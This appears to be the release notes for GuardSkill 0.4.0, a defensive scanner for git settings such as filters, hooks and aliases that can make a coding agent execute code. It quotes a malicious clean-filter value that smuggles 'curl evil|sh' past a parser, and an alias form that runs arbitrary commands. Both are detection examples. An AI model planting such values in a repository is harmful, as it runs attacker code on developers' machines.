GuardSkill is a read-only scanner for the git settings that let a repository run code in a coding agent — `core.fsmonitor`, filters, textconv, merge drivers, hooks, aliases, includes, and bare repositories hidden in the tree. It reads, reports, and changes nothing.

```bash
npx guardskill .
```

This is the first release on npm. It is also the version that two independent security reviews were run against, and both of them found something blocking.

## What this release is

0.4.0 closes all seventeen findings from the first review and all five from the second, against acceptance criteria written before the work started. Detection stays at git level; a confidence axis and the next detection class are 0.5.0.

The four findings worth reading about, because they are the ones that would have made the tool lie to you:

- **The published binary did not start a scan.** The CLI guarded its own execution with a check that is false when npm's bin symlink starts it. Installed from the registry, `guardskill` printed nothing and exited 0 — a passing scan that never ran. The tests now drive the packed tarball on Linux, macOS and Windows, because that is the only artifact a user actually gets.
- **A quote opened halfway through a value hid the payload.** `clean = cat" ; curl evil|sh"` read as the bare command `cat"` and scored low, while git read the whole line and ran it. The parser is now a single pass carrying quote state, checked against 553 cases — 41 hand-written and 512 generated permutations — put to `git config --file` offline and committed.
- **An unreadable file was reported as a clean one.** A 400 MB hook script was loaded whole, threw past Node's maximum string length, and the catch turned that into "found nothing". A file that exists and cannot be read is now its own finding and marks the scan INCOMPLETE.
- **JSON was truncated at exactly 65,536 bytes through a pipe, with the exit code still reporting success.** `process.exit()` is gone from every path that writes to stdout.

Alongside those: `include.path` is followed and inspected instead of noted; `git` is no longer treated as a safe command prefix (`git -c alias.x=!cmd x` is an arbitrary command that starts with the word git); seven more executing keys are covered; config files reached through a symlink are refused rather than read; and severity now depends on what a value names rather than on which key holds it, so `clean = cat` is informational and `clean = /tmp/x` is not.

Full detail per finding ID is in [CHANGELOG.md](CHANGELOG.md). The reviews themselves, and the acceptance gate they were judged against, are in [docs/](docs/).

## Verifying what you install

Published from the tag by GitHub Actions with npm provenance, so the package on the registry is traceable to the workflow run and the commit that built it:

```bash
npm audit signatures
```

## Using it

```bash
npx guardskill .                     # scan a project
npx guardskill . --json              # machine-readable, schemaVersion 1
npx skills add soemoescode/guardskill  # as an agent skill, so the agent runs it itself
```

In CI:

```yaml
- uses: soemoescode/guardskill@v0.4.0
  with:
    fail-on: high
```

Exit codes: `0` nothing at or above the threshold and the whole tree inspected · `1` findings at or above it · `2` the scan could not run · `3` part of the tree was not inspected.

## What it does not do

It stops at git level. Agent settings files, MCP server definitions and npm lifecycle scripts reach the same outcome by a different route and are not covered here — that class is 0.5.0. Four executing git keys are deliberately out of scope; they are listed with reasons in [rules/git-exec-keys-inventory.md](rules/git-exec-keys-inventory.md), and the accepted residual risks are in [SECURITY.md](SECURITY.md).

False positives are the most useful thing you can report. 66 tests, none skipped on Linux, no dependencies, no network, no telemetry, MIT.
